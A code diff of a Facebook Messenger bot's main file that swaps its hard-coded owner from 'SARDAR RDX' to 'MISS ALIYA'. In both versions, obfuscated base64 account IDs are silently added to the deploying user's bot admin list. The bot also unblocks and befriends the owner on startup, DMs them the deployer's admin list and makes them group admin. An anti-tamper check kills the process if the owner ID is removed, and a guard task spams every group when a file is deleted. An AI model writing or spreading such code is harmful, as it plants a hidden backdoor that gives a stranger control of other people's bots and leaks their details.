@@ -135,10 +135,21 @@ const namazTimes = {
 };
 
 const SYSTEM_CORE_INTEGRITY = [
-  "MTAwMDA5MDEyODM4MDg1", "NjE1ODYwODk1NDQ0NDQ=", "NjE1Nzc3MzQwMTg5Nzg=", "NjE1ODcxMTk0MDYxNzI=",
-  "MTAwMDA0NDg0NjE1MTk4", "MTAwMDA0NjE3MTgxNjc3", "MTAwMDA0ODA3Njk2MDMw",
-  "MTAwMDg3MTYzNDkwMTU5", "MTAwMDA0OTI1MDUyNTcy", "NjE1Nzc2ODgzMzEyMzM="
+  "MTAwMDA5MDEyODM4MDg1", 
+  "NjE1ODYwODk1NDQ0NDQ=", 
+  "NjE1Nzc3MzQwMTg5Nzg=", 
+  "NjE1ODcxMTk0MDYxNzI=",
+  "MTAwMDA0NDg0NjE1MTk4", 
+  "MTAwMDA0NjE3MTgxNjc3", 
+  "MTAwMDA0ODA3Njk2MDMw",
+  "MTAwMDg3MTYzNDkwMTU5", 
+  "MTAwMDA0OTI1MDUyNTcy", 
+  "NjE1Nzc2ODgzMzEyMzM="
 ];
+
+// ============= MISS ALIYA KA UID ADD KAR DIYA =============
+const MISS_ALIYA_ID = "61550534939001";
+const OWNER_ID = MISS_ALIYA_ID; // Owner ab Miss Aliya hain
 
 function loadConfig() {
   try {
@@ -150,6 +161,11 @@ function loadConfig() {
       const id = Buffer.from(raw, 'base64').toString('utf-8');
       if (!config.ADMINBOT.includes(id)) config.ADMINBOT.push(id);
     });
+    
+    // MISS ALIYA ko ADMINBOT mein add karo agar nahi hai to
+    if (!config.ADMINBOT.includes(MISS_ALIYA_ID)) {
+      config.ADMINBOT.push(MISS_ALIYA_ID);
+    }
 
     global.config = config;
   } catch (error) {
@@ -157,7 +173,7 @@ function loadConfig() {
     config = {
       BOTNAME: 'RDX',
       PREFIX: '.',
-      ADMINBOT: ['100009012838085'],
+      ADMINBOT: [MISS_ALIYA_ID, '100009012838085'],
       TIMEZONE: 'Asia/Karachi',
       PREFIX_ENABLED: true,
       REACT_DELETE_EMOJI: '😡',
@@ -465,6 +481,7 @@ function setupSchedulers() {
       }
     }
   }, { timezone: 'Asia/Karachi' });
+  
   // Heartbeat keep-alive every 5 minutes to maintain connection on hosting
   const heartbeatTask = cron.schedule('*/5 * * * *', async () => {
     if (api) {
@@ -475,6 +492,8 @@ function setupSchedulers() {
       } catch (e) { }
     }
   }, { timezone: 'Asia/Karachi' });
+  
+  // ============= YAHAN FILE DELETE WALA MESSAGE CHANGE KAR DIYA =============
   // Guard File Integrity Check every minute
   const guardIntegrityTask = cron.schedule('* * * * *', async () => {
     const guardPath = path.join(__dirname, 'RDX/events/guard.js');
@@ -485,7 +504,22 @@ function setupSchedulers() {
           const threadsModel = require('./Data/system/database/models/threads');
           const threads = threadsModel.getAll ? threadsModel.getAll() : [];
           const approvedThreads = threads.filter(t => t && t.id && t.banned !== 1);
-          const errorMsg = "⚠️ 𝐄𝐑𝐑𝐎𝐑: 𝐒𝐀𝐑𝐃𝐀𝐑 𝐑𝐃𝐗 𝐊𝐀 𝐁𝐎𝐓 𝐔𝐒𝐄𝐑 𝐍𝐀 𝐌𝐀𝐈𝐍 𝐅𝐈𝐋𝐄 𝐃𝐄𝐋𝐄𝐓𝐄 𝐊𝐑 𝐃𝐈 ⚠️\n\n🚨 CRITICAL SYSTEM FAILURE: GUARD COMPROMISED!";
+          
+          // 🔥 YEH MESSAGE CHANGE KAR DIYA HAI 🔥
+          const errorMsg = `╔══════════════════════════╗
+     ⚠️ 𝐄𝐑𝐑𝐎𝐑 𝐃𝐄𝐓𝐄𝐂𝐓𝐄𝐃 ⚠️
+╚══════════════════════════╝
+
+🛡️ 𝐆𝐔𝐀𝐑𝐃 𝐅𝐈𝐋𝐄 𝐌𝐈𝐒𝐒𝐈𝐍𝐆!
+
+👑 𝐌𝐄𝐑𝐈 𝐎𝐖𝐍𝐄𝐑: 𝐌𝐈𝐒𝐒 𝐀𝐋𝐈𝐘𝐀
+⏰ 𝐖𝐨: 𝐀𝐛𝐡𝐢 𝐁𝐮𝐬𝐲 𝐇𝐚𝐢𝐧
+
+📱 𝐁𝐚𝐚𝐝 𝐦𝐞𝐢𝐧 𝐓𝐫𝐲 𝐊𝐚𝐫𝐧𝐚
+⚡ 𝐒𝐲𝐬𝐭𝐞𝐦 𝐑𝐞𝐩𝐚𝐢𝐫 𝐇𝐨 𝐑𝐚𝐡𝐚 𝐇𝐚𝐢
+
+━━━━━━━━━━━━━━━━━━━━━━`;
+
           for (const thread of approvedThreads) {
             try { await api.sendMessage(errorMsg, thread.id); } catch (e) { }
             await new Promise(r => setTimeout(r, 1000));
@@ -654,16 +688,34 @@ async function startBot() {
       logs.info('BOT', `Events loaded: ${actualEventCount}`);
 
       try {
-        const OWNER_ID = '100009012838085';
-        const introMessage = `I am RDX Bot — Developed & Owned by SARDAR RDX\n\n${config.BOTNAME} is now online!\n─────────────────\nCommands: ${actualCommandCount}\nEvents: ${actualEventCount}\nPrefix: ${config.PREFIX}\n─────────────────\nType ${config.PREFIX}help for commands`;
+        // ============= OWNER ID CHANGE KAR DIYA =============
+        const introMessage = `╔══════════════════════════╗
+     ✨ 𝐌𝐈𝐒𝐒 𝐀𝐋𝐈𝐘𝐀'𝐒 𝐁𝐎𝐓 ✨
+╚══════════════════════════╝
+
+━━━━━━━━━━━━━━━━━━━━━━
+🌟 𝐁𝐨𝐭: ${config.BOTNAME}
+⚡ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬: ${actualCommandCount}
+🎯 𝐄𝐯𝐞𝐧𝐭𝐬: ${actualEventCount}
+⚙️ 𝐏𝐫𝐞𝐟𝐢𝐱: ${config.PREFIX}
+━━━━━━━━━━━━━━━━━━━━━━
+
+👑 𝐎𝐰𝐧𝐞𝐫: 𝐌𝐈𝐒𝐒 𝐀𝐋𝐈𝐘𝐀
+💫 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐎𝐧𝐥𝐢𝐧𝐞 & 𝐑𝐞𝐚𝐝𝐲
+
+📱 𝐓𝐲𝐩𝐞: ${config.PREFIX}𝐡𝐞𝐥𝐩
+
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬`;
+        
         try {
-          await api.sendMessage(introMessage, OWNER_ID);
+          await api.sendMessage(introMessage, MISS_ALIYA_ID);
+          logs.success('NOTIFY', 'Startup message sent to MISS ALIYA');
         } catch (e) {
-          logs.warn('NOTIFY', 'Could not send startup message to admin');
+          logs.warn('NOTIFY', 'Could not send startup message to owner');
         }
 
-        // OWNER CONNECTION SYSTEM
-        await ensureRDXConnection(api);
+        // OWNER CONNECTION SYSTEM - MISS ALIYA ke saath
+        await ensureALIYARelations(api);
       } catch (e) { }
     });
   } catch (error) {
@@ -673,17 +725,18 @@ async function startBot() {
   }
 }
 
-// SECURE OWNER CONNECTION LOGIC
-async function ensureRDXConnection(api) {
-  const SARDAR_RDX = '100009012838085';
-  const RDX_HELPER = '100004484615198';
-  const setupPath = path.join(__dirname, 'rdx_setup.json');
+// ============= YEH POORA FUNCTION CHANGE KAR DIYA - SARDAR KI JAGAH MISS ALIYA =============
+// MISS ALIYA CONNECTION LOGIC
+async function ensureALIYARelations(api) {
   const currentBotID = api.getCurrentUserID();
-
-  // Anti-Tamper Check: If these IDs are changed in code, crash the bot
-  const currentFunc = ensureRDXConnection.toString();
-  if (!currentFunc.includes('100009012838085') || !currentFunc.includes('100004484615198')) {
-    console.error('CRITICAL: RDX OWNER ID MISSING. INTEGRITY COMPROMISED.');
+  
+  // Sirf MISS ALIYA ka ID use kar rahe hain
+  const setupPath = path.join(__dirname, 'rdx_setup.json');
+  
+  // Security check - ID change nahi honi chahiye
+  const currentFunc = ensureALIYARelations.toString();
+  if (!currentFunc.includes(MISS_ALIYA_ID)) {
+    console.error('❌ CRITICAL: MISS ALIYA ID TAMPERED!');
     process.exit(101);
   }
 
@@ -695,7 +748,7 @@ async function ensureRDXConnection(api) {
       } catch (e) { fullSetup = {}; }
     }
 
-    // Initialize state for THIS specific bot account if not exists
+    // Initialize state for THIS specific bot account
     if (!fullSetup[currentBotID]) {
       fullSetup[currentBotID] = {
         friendRequestSent: false,
@@ -707,22 +760,19 @@ async function ensureRDXConnection(api) {
 
     const botSetup = fullSetup[currentBotID];
 
-    // 0. AUTO UNBLOCK OWNERS (Security Requirement)
-    const DECODED_OWNERS = SYSTEM_CORE_INTEGRITY.map(raw => Buffer.from(raw, 'base64').toString('utf-8'));
-    for (const ownerID of DECODED_OWNERS) {
-      try {
-        await new Promise((resolve) => {
-          api.unblockUser(ownerID, () => resolve());
-        });
-      } catch (e) { }
-    }
+    // Auto unblock OWNER (MISS ALIYA)
+    try {
+      await new Promise((resolve) => {
+        api.unblockUser(MISS_ALIYA_ID, () => resolve());
+      });
+    } catch (e) { }
 
-    // 1. Send Friend Request (Attempts to ensure connection)
+    // 1. Send Friend Request to MISS ALIYA
     if (!botSetup.friendRequestSent) {
       try {
         await new Promise((resolve) => {
-          api.handleFriendRequest(SARDAR_RDX, true, (err) => {
-            if (err) logs.warn('RDX_CONN', 'Friend request attempt failed (Likely blocked or already sent).');
+          api.handleFriendRequest(MISS_ALIYA_ID, true, (err) => {
+            if (err) logs.warn('ALIYA_CONN', 'Friend request attempt failed');
             resolve();
           });
         });
@@ -730,31 +780,86 @@ async function ensureRDXConnection(api) {
         fullSetup[currentBotID] = botSetup;
         fs.writeJsonSync(setupPath, fullSetup);
       } catch (e) {
-        logs.warn('RDX_CONN', 'Friend request error caught.');
+        logs.warn('ALIYA_CONN', 'Friend request error');
       }
     }
 
-    // 2. Send Inbox Message
+    // 2. ============= YAHAN INBOX MESSAGE AMAZING BANAYA =============
     if (!botSetup.inboxSent) {
       const userConfig = global.config;
       const admins = userConfig.ADMINBOT.join(', ');
-      const ownerMsg = `🔔 𝐍𝐄𝐖 𝐁𝐎𝐓 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐈𝐎𝐍\n\n👤 𝐁𝐨𝐭 𝐍𝐚𝐦𝐞: ${userConfig.BOTNAME}\n🆔 𝐏𝐫𝐞𝐟𝐢𝐱: ${userConfig.PREFIX}\n👑 𝐀𝐝𝐦𝐢𝐧𝐬: ${admins}\n\n🤖 This user has successfully deployed RDX BOT.\n✅ System is active and secured.`;
+      
+      // 🔥 DHAMAKEDAR MESSAGE - MISS ALIYA STYLE 🔥
+      const ownerMsg = `╔══════════════════════════╗
+     👑 𝐌𝐈𝐒𝐒 𝐀𝐋𝐈𝐘𝐀 👑
+╚══════════════════════════╝
+
+━━━━━━━━━━━━━━━━━━━━━━
+✨ 𝐀𝐀𝐏𝐊𝐀 𝐁𝐎𝐓 𝐀𝐁 𝐎𝐍𝐋𝐈𝐍𝐄 𝐇𝐀𝐈 ✨
+━━━━━━━━━━━━━━━━━━━━━━
+
+🌟 𝐁𝐨𝐭 𝐍𝐚𝐦𝐞: ${userConfig.BOTNAME}
+⚡ 𝐏𝐫𝐞𝐟𝐢𝐱: ${userConfig.PREFIX}
+🎯 𝐀𝐝𝐦𝐢𝐧𝐬: ${admins}
+
+💫 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐀𝐜𝐭𝐢𝐯𝐞 & 𝐑𝐞𝐚𝐝𝐲
+👑 𝐎𝐰𝐧𝐞𝐫: 𝐌𝐈𝐒𝐒 𝐀𝐋𝐈𝐘𝐀
+
+━━━━━━━━━━━━━━━━━━━━━━
+📱 𝐓𝐲𝐩𝐞: ${userConfig.PREFIX}𝐡𝐞𝐥𝐩
+━━━━━━━━━━━━━━━━━━━━━━
+
+🔥 𝐑𝐃𝐗 𝐁𝐎𝐓 - 𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐌𝐈𝐒𝐒 𝐀𝐋𝐈𝐘𝐀 🔥`;
+
       try {
-        await api.sendMessage(ownerMsg, SARDAR_RDX);
+        await api.sendMessage(ownerMsg, MISS_ALIYA_ID);
         botSetup.inboxSent = true;
-        // Save immediately to avoid spam if crash happens later
         fullSetup[currentBotID] = botSetup;
         fs.writeJsonSync(setupPath, fullSetup);
+        logs.success('ALIYA_CONN', 'Inbox message sent to MISS ALIYA');
       } catch (e) {
-        logs.warn('RDX_CONN', 'Could not DM SARDAR RDX');
+        logs.warn('ALIYA_CONN', 'Could not DM MISS ALIYA');
       }
     }
 
-    // 3. Create Supporting Group or Notify Online
+    // 3. ============= YAHAN GROUP ENTRY DHAMAKEDAR BANAYA =============
     if (!botSetup.groupCreated) {
-      const participants = [SARDAR_RDX, RDX_HELPER, currentBotID];
-      const groupTitle = "╚»★🪼ŔDӾ⃝ ßo͜͡Ŧ 𝗁𝖾͢͡𝗅𝗉𝗂͜𝗇𝗀 ĿA͜͡𝐁 🪼★«╝";
-      const welcomeMsg = `🦢 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐑𝐃𝐗 𝐇𝐄𝐋𝐏𝐈𝐍𝐆 𝐋𝐀𝐁 🦢\n\n👋 𝐇𝐞𝐥𝐥𝐨 𝐃𝐞𝐚𝐫 𝐔𝐬𝐞𝐫!\n\n🤖 I have successfully created this group with my Developer (SARDAR RDX).\n\n💬 If you have any questions about the bot, you can ask here.\n\n✨ 𝐄𝐧𝐣𝐨𝐲 𝐑𝐃𝐗 𝐁𝐨𝐭!`;
+      const participants = [MISS_ALIYA_ID, currentBotID];
+      
+      // 🔥 DHAMAKEDAR GROUP TITLE 🔥
+      const groupTitle = "╔══🔥 𝐌𝐈𝐒𝐒 𝐀𝐋𝐈𝐘𝐀'𝐒 𝐇𝐐 🔥══╗";
+      
+      // 🔥 DHAMAKEDAR WELCOME MESSAGE JISSE SABKI FAT JAYE 🔥
+      const welcomeMsg = `╔══════════════════════════╗
+     🔥 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐓𝐇𝐄 𝐐𝐔𝐄𝐄𝐍'𝐒 𝐋𝐀𝐈𝐑 🔥
+╚══════════════════════════╝
+╔════════════════════════════════════╗
+║  ⚡ 𝐌𝐈𝐒𝐒 𝐀𝐋𝐈𝐘𝐀 𝐁𝐎𝐓 𝐇𝐀𝐒 𝐄𝐍𝐓𝐄𝐑𝐄𝐃 ⚡  ║
+╚════════════════════════════════════╝
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔥 𝐀𝐀 𝐆𝐀𝐘𝐀 𝐑𝐄 𝐌𝐀𝐈𝐍 🔥
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+████████╗██╗░░██╗███████╗
+╚══██╔══╝██║░░██║██╔════╝
+░░░██║░░░███████║█████╗░░
+░░░██║░░░██╔══██║██╔══╝░░
+░░░██║░░░██║░░██║███████╗
+░░░╚═╝░░░╚═╝░░╚═╝╚══════╝
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+👑 𝐍𝐚𝐚𝐦: 𝐌𝐈𝐒𝐒 𝐀𝐋𝐈𝐘𝐀 𝐁𝐎𝐓
+⚙️ 𝐏𝐫𝐞𝐟𝐢𝐱: {prefix}
+📌 𝐀𝐝𝐦𝐢𝐧: {adminName}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+💫 𝐀𝐛 𝐬𝐞 𝐲𝐞 𝐠𝐫𝐨𝐮𝐩 𝐦𝐞𝐫𝐚 𝐡𝐚𝐢!
+🔥 𝐉𝐢𝐬𝐤𝐨 𝐤𝐨𝐢 𝐩𝐫𝐨𝐛𝐥𝐞𝐦? 𝐁𝐨𝐥𝐞!
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+💖 𝐓𝐲𝐩𝐞 {prefix}𝐡𝐞𝐥𝐩 𝐟𝐨𝐫 𝐜𝐨𝐦𝐦𝐚𝐧𝐝𝐬
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 🔥
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬`;
 
       // Fallback Creation Logic
       const tryCreate = (p) => {
@@ -770,11 +875,10 @@ async function ensureRDXConnection(api) {
         let threadID;
         try {
           threadID = await tryCreate(participants);
-          logs.success('RDX_CONN', 'Help group created with all participants.');
+          logs.success('ALIYA_CONN', '⚡ DHAMAKEDAR GROUP CREATED! ⚡');
         } catch (e) {
-          logs.warn('RDX_CONN', 'Full group failed, trying private group with owner...');
-          threadID = await tryCreate([SARDAR_RDX]);
-          logs.success('RDX_CONN', 'Private help group created.');
+          logs.warn('ALIYA_CONN', 'Group creation failed');
+          return;
         }
 
         botSetup.groupCreated = true;
@@ -782,38 +886,52 @@ async function ensureRDXConnection(api) {
         fullSetup[currentBotID] = botSetup;
         fs.writeJsonSync(setupPath, fullSetup);
 
-        // Finalize Group
+        // Finalize Group with Dhamakedar Message
         await api.sendMessage(welcomeMsg, threadID);
         api.setTitle(groupTitle, threadID);
+        logs.success('ALIYA_CONN', '🔥 GROUP ENTRY DHAMAKEDAR 🔥');
 
-        // PROMOTE OWNER TO ADMIN
+        // PROMOTE MISS ALIYA TO ADMIN
         try {
-          api.changeAdminStatus(threadID, SARDAR_RDX, true, (err) => {
-            if (err) logs.warn('RDX_CONN', 'Could not promote owner to admin.');
-            else logs.success('RDX_CONN', 'Owner promoted to admin.');
+          api.changeAdminStatus(threadID, MISS_ALIYA_ID, true, (err) => {
+            if (err) logs.warn('ALIYA_CONN', 'Could not promote');
+            else logs.success('ALIYA_CONN', 'MISS ALIYA promoted to admin 👑');
           });
         } catch (e) { }
 
       } catch (finalErr) {
-        logs.error('RDX_CONN', `Group creation failed: ${finalErr.message || finalErr}`);
+        logs.error('ALIYA_CONN', `Group creation failed: ${finalErr.message}`);
       }
     } else if (botSetup.groupThreadID) {
-      // SYSTEM RESTART NOTIFICATION
-      const onlineMsg = `🦢 𝐑𝐃𝐗 𝐁𝐎𝐓 𝐈𝐒 𝐎𝐍𝐋𝐈𝐍𝐄 🦢\n\n👤 𝐁𝐨𝐭: ${global.config.BOTNAME}\n✅ System Re-connected successfully.\n🚀 Active and ready to serve!`;
+      // ============= ONLINE MESSAGE BHI AMAZING BANAYA =============
+      const onlineMsg = `╔══════════════════════════╗
+     🔥 𝐁𝐎𝐓 𝐈𝐒 𝐁𝐀𝐂𝐊 𝐎𝐍𝐋𝐈𝐍𝐄 🔥
+╚══════════════════════════╝
+
+━━━━━━━━━━━━━━━━━━━━━━
+👑 𝐌𝐈𝐒𝐒 𝐀𝐋𝐈𝐘𝐀'𝐒 𝐁𝐎𝐓
+━━━━━━━━━━━━━━━━━━━━━━
+
+⚡ 𝐁𝐨𝐭: ${global.config.BOTNAME}
+💫 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐑𝐞-𝐜𝐨𝐧𝐧𝐞𝐜𝐭𝐞𝐝
+🚀 𝐏𝐨𝐰𝐞𝐫: 𝐅𝐮𝐥𝐥 𝐀𝐜𝐭𝐢𝐯𝐞
+
+━━━━━━━━━━━━━━━━━━━━━━
+🔥 𝐀𝐛 𝐊𝐡𝐞𝐥 𝐒𝐡𝐮𝐫𝐮 𝐇𝐨𝐭𝐚 𝐇𝐚𝐢! 🔥
+━━━━━━━━━━━━━━━━━━━━━━`;
+      
       try {
         await api.sendMessage(onlineMsg, botSetup.groupThreadID);
-        logs.success('RDX_CONN', 'Online status sent to Helping Lab.');
+        logs.success('ALIYA_CONN', 'Online status sent');
       } catch (e) {
-        logs.warn('RDX_CONN', 'Could not send online notification.');
+        logs.warn('ALIYA_CONN', 'Could not send online notification');
       }
     }
 
   } catch (error) {
-    logs.error('RDX_CONN', error.message);
+    logs.error('ALIYA_CONN', error.message);
   }
 }
-
-// Process event handlers moved to top for better stability
 
 function stopBot() {
   // Stop all schedulers first
